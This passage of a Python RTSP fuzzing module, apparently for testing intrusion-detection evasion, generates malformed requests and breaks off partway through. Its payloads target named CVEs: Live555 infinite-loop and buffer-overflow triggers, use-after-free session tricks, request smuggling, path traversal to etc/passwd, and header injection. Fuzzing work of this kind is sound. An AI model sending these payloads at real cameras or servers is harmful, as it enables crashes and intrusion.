"""
RTSP (Real Time Streaming Protocol) mutation strategies for IDS evasion fuzzing.

14 CVE-grounded mutation strategies targeting RTSP parsers (Live555, VLC,
GStreamer, IP cameras) and IDS text rules (Snort 3 has NO dedicated RTSP
inspector — detection relies on AppID + generic content rules on TCP 554).

Transport: TCP 554 (primary).  Methods are CASE-SENSITIVE (unlike SIP/MGCP).
Stateful: Init → Ready → Playing/Recording.
Unique: interleaved binary $ framing, HTTP tunneling mode.

Sources:
  RFC 2326 / RFC 7826, Live555 CVEs (CVE-2013-6933/6934, CVE-2018-4013,
  CVE-2019-6256, CVE-2019-7314, CVE-2019-15232), SSD Advisory (BOF+dir
  traversal), IoTFuzzSentry (arXiv 2509.09158), Ptacek & Newsham IDS
  evasion (1998), HackTricks CRLF injection, Snort 3 content matching.
"""

import os
import random
import struct
import string
import time

# ── Constants ──────────────────────────────────────────────────────────────

_MAX_SEG = 65000          # Max segment size for payloads
_RTSP_PORT = 554          # Default RTSP port

RTSP_STRATEGIES = [
    "request_line_malformation",
    "content_length_smuggling",
    "transport_header_overflow",
    "interleaved_binary_injection",
    "session_state_confusion",
    "http_tunneling_abuse",
    "sdp_body_malformation",
    "oversized_header_overflow",
    "cseq_pipelining_abuse",
    "method_verb_fuzzing",
    "uri_encoding_evasion",
    "crlf_header_injection",
    "tcp_segmentation_evasion",
    "range_time_format_abuse",
]

RTSP_WEIGHTS = [14, 12, 12, 10, 14, 14, 10, 12, 8, 8, 8, 10, 10, 6]

RTSP_STRATEGY_LABELS = {
    "request_line_malformation":    "Request-Line Malformation (CVE-2013-6933/6934)",
    "content_length_smuggling":     "Content-Length Smuggling",
    "transport_header_overflow":    "Transport Header Overflow",
    "interleaved_binary_injection": "Interleaved Binary ($) Injection",
    "session_state_confusion":      "Session State Confusion (CVE-2019-15232/7314)",
    "http_tunneling_abuse":         "HTTP Tunneling Abuse (CVE-2018-4013/CVE-2019-6256)",
    "sdp_body_malformation":        "SDP Body Malformation",
    "oversized_header_overflow":    "Oversized Header Overflow (SSD Advisory)",
    "cseq_pipelining_abuse":        "CSeq / Pipelining Abuse",
    "method_verb_fuzzing":          "Method Verb Fuzzing (Case-Sensitive)",
    "uri_encoding_evasion":         "URI Encoding Evasion",
    "crlf_header_injection":        "CRLF Header Injection",
    "tcp_segmentation_evasion":     "TCP Segmentation Evasion (Ptacek & Newsham)",
    "range_time_format_abuse":      "Range / Time Format Abuse",
}

# ── Helpers ────────────────────────────────────────────────────────────────

def _rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def _rand_hex(n):
    return "".join(random.choices("0123456789abcdef", k=n))

def _rand_cseq():
    return str(random.randint(1, 999999))

def _rand_session_id(length=None):
    length = length or random.randint(8, 24)
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))

def _rand_uri(host=None):
    host = host or _rand_ip()
    paths = [
        "/media.mp4", "/live/stream1", "/video/channel1",
        "/cam/realmonitor", "/h264/ch1/main/av_stream",
        f"/MediaInput/h264/stream_{random.randint(1,8)}",
        f"/Streaming/Channels/{random.randint(1,16)}01",
    ]
    return f"rtsp://{host}:{_RTSP_PORT}{random.choice(paths)}"

def _basic_headers(method="OPTIONS", uri=None, cseq=None, session=None, extra=None):
    """Build a minimal valid RTSP request with given parameters."""
    uri = uri or _rand_uri()
    cseq = cseq or _rand_cseq()
    lines = [f"{method} {uri} RTSP/1.0"]
    lines.append(f"CSeq: {cseq}")
    if session:
        lines.append(f"Session: {session}")
    lines.append(f"User-Agent: ProtocolFuzzer/1.0")
    if extra:
        lines.extend(extra)
    return "\r\n".join(lines) + "\r\n\r\n"

def _make_sdp(ip=None):
    """Generate a minimal valid SDP body."""
    ip = ip or _rand_ip()
    sess_id = str(random.randint(10000, 99999))
    return (
        f"v=0\r\n"
        f"o=- {sess_id} {sess_id} IN IP4 {ip}\r\n"
        f"s=Fuzzer Session\r\n"
        f"c=IN IP4 {ip}\r\n"
        f"t=0 0\r\n"
        f"m=audio {random.randint(1024, 65534)} RTP/AVP 0\r\n"
        f"a=rtpmap:0 PCMU/8000\r\n"
    )

# ── Strategy 1: request_line_malformation ──────────────────────────────────

def _build_request_line_malformation():
    """CVE-2013-6933/6934: leading space/tab causes infinite loop in
    Live555 parseRTSPRequestString.  Also tests missing/oversized method,
    bad version, malformed URI, path traversal."""
    variant = random.randint(0, 7)
    uri = _rand_uri()

    if variant == 0:
        # Leading space before method (CVE-2013-6933 exact trigger)
        payload = f" DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    elif variant == 1:
        # Leading tab before method (CVE-2013-6934)
        payload = f"\tDESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    elif variant == 2:
        # Missing method entirely
        payload = f" {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    elif variant == 3:
        # Oversized method token (20KB)
        huge_method = "A" * 20000
        payload = f"{huge_method} {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    elif variant == 4:
        # Bad RTSP version
        versions = ["RTSP/9.9", "RTSP/0.0", "HTTP/1.1", "rtsp/1.0", "RTSP/1.0extra", ""]
        payload = f"DESCRIBE {uri} {random.choice(versions)}\r\nCSeq: 1\r\n\r\n"
    elif variant == 5:
        # Path traversal in URI
        host = _rand_ip()
        traversal = "/../" * random.randint(5, 50) + "etc/passwd"
        payload = f"DESCRIBE rtsp://{host}:{_RTSP_PORT}/{traversal} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    elif variant == 6:
        # Oversized URI path (>4KB)
        host = _rand_ip()
        long_path = "/" + "A" * random.randint(4000, 20000)
        payload = f"DESCRIBE rtsp://{host}:{_RTSP_PORT}{long_path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
    else:
        # Multiple spaces between fields + extra junk
        payload = f"DESCRIBE   {uri}   RTSP/1.0  \r\nCSeq: 1\r\n\r\n"

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 2: content_length_smuggling ───────────────────────────────────

def _build_content_length_smuggling(payload_override=None):
    """Content-Length vs actual body mismatch for request smuggling.
    Adapted from HTTP CL.0/CL.TE techniques."""
    if payload_override is not None:
        uri = _rand_uri()
        cseq = _rand_cseq()
        body = b"AAAA" + payload_override
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
        ).encode() + body
        return payload[:_MAX_SEG], _RTSP_PORT
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()
    sdp = _make_sdp()

    if variant == 0:
        # CL shorter than actual body — IDS stops reading early
        short_cl = max(1, len(sdp) // 3)
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {short_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 1:
        # CL longer than actual body — server reads into next request
        long_cl = len(sdp) + random.randint(500, 5000)
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {long_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 2:
        # CL=0 with body present
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 3:
        # Huge CL to trigger allocation
        huge_cl = random.choice([2**31, 2**31 - 1, 2**32 - 1, 2**63 - 1, 99999999])
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {huge_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 4:
        # Negative CL
        neg_cl = random.choice([-1, -2147483648, -99999])
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {neg_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 5:
        # Multiple CL headers with conflicting values
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {len(sdp)}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{sdp}"
        )
    elif variant == 6:
        # Non-numeric CL
        bad_cl = random.choice(["AAAA", "0x1000", "1e10", "", " ", "twelve"])
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {bad_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    else:
        # CL on bodyless method (OPTIONS shouldn't have body)
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Length: {len(sdp)}\r\n"
            f"\r\n"
            f"{sdp}"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 3: transport_header_overflow ──────────────────────────────────

def _build_transport_header_overflow():
    """SETUP Transport header: conflicting params, bad ports, huge TTL,
    channel overlap, unknown lower-transport, oversized ssrc."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # Conflicting unicast + multicast
        transport = "RTP/AVP;unicast;multicast;client_port=8000-8001"
    elif variant == 1:
        # Bad port ranges
        transport = f"RTP/AVP;unicast;client_port={random.choice(['0-0', '99999-99999', '-1--1', '65536-65537', '8000-7999'])}"
    elif variant == 2:
        # Huge TTL
        transport = f"RTP/AVP;multicast;ttl={random.choice([0, 256, 65535, 2**31])};client_port=8000-8001"
    elif variant == 3:
        # Channel overlap in interleaved
        transport = "RTP/AVP/TCP;interleaved=0-0;interleaved=1-1;interleaved=0-1"
    elif variant == 4:
        # Unknown lower-transport
        transport = f"RTP/AVP/{random.choice(['SCTP', 'QUIC', 'UNKNOWN', 'XXX' * 100])};unicast;client_port=8000-8001"
    elif variant == 5:
        # Oversized ssrc (should be 8 hex digits)
        transport = f"RTP/AVP;unicast;client_port=8000-8001;ssrc={'F' * random.randint(100, 5000)}"
    elif variant == 6:
        # Many conflicting parameters
        params = ";".join([
            "unicast", "multicast", f"destination={_rand_ip()}", f"source={_rand_ip()}",
            "layers=99", "mode=PLAY", "mode=RECORD", "append",
            f"interleaved=0-{random.randint(100, 255)}",
            f"ttl={random.randint(0, 999)}", f"port={random.randint(0, 99999)}-{random.randint(0, 99999)}",
            f"client_port={random.randint(0, 99999)}-{random.randint(0, 99999)}",
            f"server_port={random.randint(0, 99999)}-{random.randint(0, 99999)}",
            f"ssrc={_rand_hex(8)}",
        ])
        transport = f"RTP/AVP;{params}"
    else:
        # Oversized transport header (>4KB)
        transport = "RTP/AVP;unicast;client_port=8000-8001;" + ";".join(
            f"x-param-{i}={'V' * random.randint(50, 200)}" for i in range(50)
        )

    payload = (
        f"SETUP {uri} RTSP/1.0\r\n"
        f"CSeq: {cseq}\r\n"
        f"Transport: {transport}\r\n"
        f"\r\n"
    )
    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 4: interleaved_binary_injection ───────────────────────────────

def _build_interleaved_binary_injection(payload_override=None):
    """RTSP-unique $ (0x24) framing for interleaved binary data.
    $ + 1-byte channel + 2-byte length (big-endian) + data."""
    if payload_override is not None:
        frame = struct.pack("!BBH", 0x24, 0, len(payload_override)) + payload_override
        return frame[:_MAX_SEG], _RTSP_PORT
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # Bad channel ID (>1 normally)
        channel = random.randint(200, 255)
        data = os.urandom(random.randint(50, 500))
        frame = struct.pack("!BBH", 0x24, channel, len(data)) + data
        return frame[:_MAX_SEG], _RTSP_PORT
    elif variant == 1:
        # Huge length field (claims more than sent)
        channel = random.randint(0, 3)
        claimed_len = random.choice([0xFFFF, 0x7FFF, 60000])
        data = os.urandom(random.randint(10, 100))
        frame = struct.pack("!BBH", 0x24, channel, claimed_len) + data
        return frame[:_MAX_SEG], _RTSP_PORT
    elif variant == 2:
        # $ mid-header: inject interleaved frame inside an RTSP request
        header_part = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n"
        channel = random.randint(0, 3)
        data = os.urandom(random.randint(20, 200))
        frame = struct.pack("!BBH", 0x24, channel, len(data)) + data
        rest = "User-Agent: Fuzzer\r\n\r\n"
        payload = header_part.encode() + frame + rest.encode()
        return payload[:_MAX_SEG], _RTSP_PORT
    elif variant == 3:
        # No prior SETUP — send interleaved data on fresh connection
        data = os.urandom(random.randint(100, 1000))
        frame = struct.pack("!BBH", 0x24, 0, len(data)) + data
        return frame[:_MAX_SEG], _RTSP_PORT
    elif variant == 4:
        # Nested $ frames ($ inside $ data)
        inner_data = os.urandom(50)
        inner = struct.pack("!BBH", 0x24, 1, len(inner_data)) + inner_data
        outer = struct.pack("!BBH", 0x24, 0, len(inner)) + inner
        return outer[:_MAX_SEG], _RTSP_PORT
    elif variant == 5:
        # Zero-length interleaved frame
        frame = struct.pack("!BBH", 0x24, 0, 0)
        return frame, _RTSP_PORT
    elif variant == 6:
        # Many rapid interleaved frames (flood)
        frames = b""
        for _ in range(random.randint(100, 500)):
            ch = random.randint(0, 7)
            data = os.urandom(random.randint(1, 50))
            frames += struct.pack("!BBH", 0x24, ch, len(data)) + data
        return frames[:_MAX_SEG], _RTSP_PORT
    else:
        # $ frame split across what would be TCP segments
        # (single payload, but structure suggests splitting)
        data = os.urandom(500)
        frame = struct.pack("!BBH", 0x24, 0, len(data)) + data
        # Prepend a partial RTSP request to confuse framing
        partial = f"PLAY {uri} RTSP/1.0\r\n".encode()
        return (partial + frame)[:_MAX_SEG], _RTSP_PORT


# ── Strategy 5: session_state_confusion ────────────────────────────────────

def _build_session_state_confusion():
    """CVE-2019-15232 (duplicate session ID UAF), CVE-2019-7314 (UAF on
    stream termination).  Method-state matrix violations."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    host = _rand_ip()

    if variant == 0:
        # PLAY without prior SETUP (Init state → should fail 455)
        payload = _basic_headers("PLAY", uri, "1", extra=[
            f"Range: npt=0-",
        ])
    elif variant == 1:
        # Wrong session ID
        payload = _basic_headers("PLAY", uri, "1", session="INVALIDSESSION999", extra=[
            f"Range: npt=0-",
        ])
    elif variant == 2:
        # Duplicate session IDs (CVE-2019-15232 trigger)
        sid = _rand_session_id(8)
        req1 = _basic_headers("SETUP", uri, "1", extra=[
            f"Transport: RTP/AVP;unicast;client_port=8000-8001",
        ])
        req2 = _basic_headers("SETUP", uri, "2", session=sid, extra=[
            f"Transport: RTP/AVP;unicast;client_port=8002-8003",
        ])
        payload = req1 + req2
    elif variant == 3:
        # Rapid create/teardown cycle
        reqs = []
        for i in range(random.randint(20, 100)):
            sid = _rand_session_id()
            if i % 2 == 0:
                reqs.append(_basic_headers("SETUP", uri, str(i + 1), extra=[
                    f"Transport: RTP/AVP;unicast;client_port={8000 + i * 2}-{8001 + i * 2}",
                ]))
            else:
                reqs.append(_basic_headers("TEARDOWN", uri, str(i + 1), session=sid))
        payload = "".join(reqs)
    elif variant == 4:
        # PAUSE in Init state (method-state violation)
        payload = _basic_headers("PAUSE", uri, "1")
    elif variant == 5:
        # RECORD without SETUP
        payload = _basic_headers("RECORD", uri, "1", extra=[
            f"Range: npt=0-",
        ])
    elif variant == 6:
        # TEARDOWN with empty session
        payload = _basic_headers("TEARDOWN", uri, "1", session="")
    else:
        # Rapid SETUP flood (resource exhaustion)
        reqs = []
        for i in range(random.randint(50, 200)):
            reqs.append(_basic_headers("SETUP", uri, str(i + 1), extra=[
                f"Transport: RTP/AVP;unicast;client_port={8000 + i * 2}-{8001 + i * 2}",
            ]))
        payload = "".join(reqs)

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 6: http_tunneling_abuse ───────────────────────────────────────

def _build_http_tunneling_abuse():
    """CVE-2018-4013 (stack BOF in lookForHeader), CVE-2019-6256
    (crash in handleHTTPCmd_TunnelingPOST via x-sessioncookie)."""
    variant = random.randint(0, 7)
    host = _rand_ip()
    cookie = _rand_hex(24)

    if variant == 0:
        # Oversized HTTP GET header for RTSP-over-HTTP (CVE-2018-4013)
        huge_header = "X-Custom: " + "A" * random.randint(5000, 30000)
        payload = (
            f"GET /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {cookie}\r\n"
            f"Accept: application/x-rtsp-tunnelled\r\n"
            f"Pragma: no-cache\r\n"
            f"{huge_header}\r\n"
            f"\r\n"
        )
    elif variant == 1:
        # x-sessioncookie manipulation (CVE-2019-6256)
        bad_cookies = [
            "A" * 10000,           # oversized
            "",                     # empty
            "\x00" * 100,          # null bytes
            "../../../etc/passwd",  # path traversal
            "A" * 64 + "\r\nX-Injected: evil",  # header injection
        ]
        payload = (
            f"POST /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {random.choice(bad_cookies)}\r\n"
            f"Content-Type: application/x-rtsp-tunnelled\r\n"
            f"Pragma: no-cache\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
        )
    elif variant == 2:
        # Content-Base injection
        payload = (
            f"GET /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {cookie}\r\n"
            f"Content-Base: rtsp://evil.attacker.com/\r\n"
            f"Accept: application/x-rtsp-tunnelled\r\n"
            f"\r\n"
        )
    elif variant == 3:
        # HTTP POST with RTSP DESCRIBE body (tunnel confusion)
        rtsp_inner = f"DESCRIBE rtsp://{host}/media.mp4 RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        import base64 as _b64
        encoded = _b64.b64encode(rtsp_inner.encode()).decode()
        payload = (
            f"POST /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {cookie}\r\n"
            f"Content-Type: application/x-rtsp-tunnelled\r\n"
            f"Content-Length: {len(encoded)}\r\n"
            f"\r\n"
            f"{encoded}"
        )
    elif variant == 4:
        # Oversized HTTP POST body
        payload = (
            f"POST /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {cookie}\r\n"
            f"Content-Type: application/x-rtsp-tunnelled\r\n"
            f"Content-Length: {random.randint(50000, 65000)}\r\n"
            f"\r\n"
        ) + "B" * random.randint(5000, 30000)
    elif variant == 5:
        # Many HTTP headers (header table overflow)
        headers = "\r\n".join(
            f"X-Fuzz-{i}: {'V' * random.randint(100, 500)}"
            for i in range(random.randint(50, 200))
        )
        payload = (
            f"GET /stream HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"x-sessioncookie: {cookie}\r\n"
            f"{headers}\r\n"
            f"\r\n"
        )
    elif variant == 6:
        # Mixed HTTP/RTSP in same connection
        http_part = f"GET /stream HTTP/1.0\r\nHost: {host}\r\nx-sessioncookie: {cookie}\r\n\r\n"
        rtsp_part = f"OPTIONS rtsp://{host}/media.mp4 RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        payload = http_part + rtsp_part
    else:
        # HTTP CONNECT as tunnel attempt
        payload = (
            f"CONNECT {host}:{_RTSP_PORT} HTTP/1.1\r\n"
            f"Host: {host}:{_RTSP_PORT}\r\n"
            f"Proxy-Connection: keep-alive\r\n"
            f"\r\n"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 7: sdp_body_malformation ──────────────────────────────────────

def _build_sdp_body_malformation():
    """RFC 4566 SDP body torture — out-of-order lines, missing mandatory
    fields, oversized m= line, CL vs SDP mismatch, null bytes."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()
    ip = _rand_ip()

    if variant == 0:
        # Out-of-order SDP lines (v/o/s/c/t/m order violation)
        sdp = (
            f"m=audio 49170 RTP/AVP 0\r\n"
            f"v=0\r\n"
            f"s=Test\r\n"
            f"o=- 12345 12345 IN IP4 {ip}\r\n"
            f"t=0 0\r\n"
            f"c=IN IP4 {ip}\r\n"
        )
    elif variant == 1:
        # Missing mandatory fields (no v=, no s=, no o=)
        sdp = (
            f"c=IN IP4 {ip}\r\n"
            f"t=0 0\r\n"
            f"m=audio 49170 RTP/AVP 0\r\n"
        )
    elif variant == 2:
        # Oversized m= line (256 format types)
        fmts = " ".join(str(i) for i in range(256))
        sdp = (
            f"v=0\r\n"
            f"o=- 12345 12345 IN IP4 {ip}\r\n"
            f"s=Test\r\n"
            f"c=IN IP4 {ip}\r\n"
            f"t=0 0\r\n"
            f"m=audio 49170 RTP/AVP {fmts}\r\n"
        )
    elif variant == 3:
        # CL vs SDP size mismatch
        sdp = _make_sdp(ip)
        wrong_cl = len(sdp) + random.randint(500, 5000)
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {wrong_cl}\r\n"
            f"\r\n"
            f"{sdp}"
        )
        return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT
    elif variant == 4:
        # Null bytes in SDP values
        sdp = (
            f"v=0\r\n"
            f"o=- 12345 12345 IN IP4 {ip}\r\n"
            f"s=Test\x00Evil\r\n"
            f"c=IN IP4 {ip}\x00\r\n"
            f"t=0 0\r\n"
            f"m=audio 49170 RTP/AVP 0\r\n"
        )
    elif variant == 5:
        # Oversized SDP body (>10KB)
        sdp = _make_sdp(ip)
        sdp += "a=fmtp:96 " + "x" * random.randint(10000, 30000) + "\r\n"
    elif variant == 6:
        # Bad port in m= line
        port = random.choice([-1, 0, 99999, 4294967296, 65536])
        sdp = (
            f"v=0\r\n"
            f"o=- 12345 12345 IN IP4 {ip}\r\n"
            f"s=Test\r\n"
            f"c=IN IP4 {ip}\r\n"
            f"t=0 0\r\n"
            f"m=audio {port} RTP/AVP 0\r\n"
        )
    else:
        # Malformed c= connection address
        bad_addr = random.choice([
            "XX YY ZZ", "IN IP4 999.999.999.999", "IN IP4 0.0.0.0/256",
            "IN IP6 ::GGGG", f"IN IP4 {'1' * 500}",
        ])
        sdp = (
            f"v=0\r\n"
            f"o=- 12345 12345 IN IP4 {ip}\r\n"
            f"s=Test\r\n"
            f"c={bad_addr}\r\n"
            f"t=0 0\r\n"
            f"m=audio 49170 RTP/AVP 0\r\n"
        )

    # Wrap SDP in ANNOUNCE request if not already wrapped
    if not sdp.startswith("ANNOUNCE") and 'payload' not in dir():
        payload = (
            f"ANNOUNCE {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"Content-Type: application/sdp\r\n"
            f"Content-Length: {len(sdp)}\r\n"
            f"\r\n"
            f"{sdp}"
        )
    else:
        payload = sdp

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 8: oversized_header_overflow ──────────────────────────────────

def _build_oversized_header_overflow():
    """SSD Advisory: URI suffix concatenation overflow, oversized CSeq/
    Session/Range, many headers, header >64KB."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # Oversized CSeq (non-numeric)
        bad_cseq = "A" * random.randint(5000, 30000)
        payload = _basic_headers("OPTIONS", uri, bad_cseq)
    elif variant == 1:
        # Oversized Session ID (>256 chars)
        big_session = _rand_session_id(random.randint(500, 5000))
        payload = _basic_headers("PLAY", uri, cseq, session=big_session, extra=[
            "Range: npt=0-",
        ])
    elif variant == 2:
        # Oversized Range header
        big_range = f"npt={'9' * random.randint(1000, 10000)}-{'9' * random.randint(1000, 10000)}"
        payload = _basic_headers("PLAY", uri, cseq, session=_rand_session_id(), extra=[
            f"Range: {big_range}",
        ])
    elif variant == 3:
        # Many headers (200+)
        extras = [f"X-Fuzz-{i}: {'H' * random.randint(100, 500)}" for i in range(random.randint(200, 400))]
        payload = _basic_headers("OPTIONS", uri, cseq, extra=extras)
    elif variant == 4:
        # Single header >64KB
        huge_val = "V" * random.randint(64000, _MAX_SEG - 200)
        payload = _basic_headers("OPTIONS", uri, cseq, extra=[
            f"X-Huge: {huge_val}",
        ])
    elif variant == 5:
        # Oversized User-Agent
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {cseq}\r\n"
            f"User-Agent: {'U' * random.randint(10000, 50000)}\r\n"
            f"\r\n"
        )
    elif variant == 6:
        # URI with appended suffix overflow (SSD Advisory specific)
        host = _rand_ip()
        suffix = "/" + "X" * random.randint(5000, 20000)
        payload = f"DESCRIBE rtsp://{host}:{_RTSP_PORT}{suffix} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    else:
        # All oversized simultaneously
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: {'9' * 5000}\r\n"
            f"Session: {'S' * 5000}\r\n"
            f"Range: npt={'0' * 5000}-{'9' * 5000}\r\n"
            f"User-Agent: {'U' * 5000}\r\n"
            f"Accept: {'*/*,' * 2000}\r\n"
            f"\r\n"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 9: cseq_pipelining_abuse ──────────────────────────────────────

def _build_cseq_pipelining_abuse():
    """CSeq wrapping, duplicate, non-numeric, missing, huge pipeline,
    overlapping ranges."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    session = _rand_session_id()

    if variant == 0:
        # CSeq integer wrap (2^31, 2^32)
        big_cseq = random.choice([2**31, 2**31 - 1, 2**32, 2**32 - 1, 2**63])
        payload = _basic_headers("OPTIONS", uri, str(big_cseq))
    elif variant == 1:
        # Duplicate CSeq in same request
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"CSeq: 2\r\n"
            f"\r\n"
        )
    elif variant == 2:
        # Non-numeric CSeq
        bad = random.choice(["abc", "-1", "1.5", "", "0x1", "CSeq", "\x00\x01"])
        payload = _basic_headers("OPTIONS", uri, bad)
    elif variant == 3:
        # Missing CSeq entirely
        payload = f"OPTIONS {uri} RTSP/1.0\r\nUser-Agent: Fuzzer\r\n\r\n"
    elif variant == 4:
        # Huge pipelined request burst
        reqs = []
        for i in range(random.randint(100, 500)):
            reqs.append(_basic_headers("OPTIONS", uri, str(i + 1)))
        payload = "".join(reqs)
    elif variant == 5:
        # Pipelined PLAY with overlapping ranges
        reqs = []
        for i in range(random.randint(10, 50)):
            start = random.randint(0, 100)
            end = start + random.randint(1, 50)
            reqs.append(_basic_headers("PLAY", uri, str(i + 1), session=session, extra=[
                f"Range: npt={start}-{end}",
            ]))
        payload = "".join(reqs)
    elif variant == 6:
        # CSeq=0 (boundary)
        payload = _basic_headers("OPTIONS", uri, "0")
    else:
        # CSeq method doesn't exist in RTSP (confusion)
        payload = (
            f"OPTIONS {uri} RTSP/1.0\r\n"
            f"CSeq: 1 OPTIONS\r\n"
            f"\r\n"
        )

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 10: method_verb_fuzzing ───────────────────────────────────────

def _build_method_verb_fuzzing():
    """IoTFuzzSentry: RTSP methods are CASE-SENSITIVE.  Case mutations,
    HTTP methods as RTSP, empty method, null bytes in method."""
    variant = random.randint(0, 7)
    uri = _rand_uri()
    cseq = _rand_cseq()

    if variant == 0:
        # Case mutations (RTSP methods are case-sensitive!)
        methods_cases = ["describe", "Describe", "dESCRIBE", "DeSCRIBe",
                        "play", "Play", "PLAY ", "setup", "Setup"]
        method = random.choice(methods_cases)
        payload = f"{method} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 1:
        # HTTP methods sent as RTSP
        http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "PATCH",
                       "CONNECT", "TRACE", "PROPFIND", "MKCOL"]
        method = random.choice(http_methods)
        payload = f"{method} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 2:
        # Empty method
        payload = f" {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 3:
        # Null bytes in method
        payload = f"DES\x00CRIBE {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 4:
        # Oversized method token
        method = "X" * random.randint(1000, 10000)
        payload = f"{method} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 5:
        # Unknown RTSP extension method
        ext_methods = ["XPLAY", "XSETUP", "FOOBAR", "SUBSCRIBE", "NOTIFY", "PRACK"]
        method = random.choice(ext_methods)
        payload = f"{method} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    elif variant == 6:
        # Method with special characters
        special = random.choice(["PLAY;", "DESCRIBE\t", "OPTIONS\r", "SETUP\n", "PLAY%20"])
        payload = f"{special} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n\r\n"
    else:
        # Mixed valid/invalid in pipelined requests
        methods = ["DESCRIBE", "play", "SETUP", "get", "OPTIONS", "FOOBAR", "TEARDOWN", "Post"]
        reqs = []
        for i, m in enumerate(methods):
            reqs.append(f"{m} {uri} RTSP/1.0\r\nCSeq: {i + 1}\r\n\r\n")
        payload = "".join(reqs)

    return payload.encode("utf-8", errors="replace")[:_MAX_SEG], _RTSP_PORT


# ── Strategy 11: uri_encoding_evasion ──────────────────────────────────────

def _build_uri_encoding_evasion(payload_override=None):
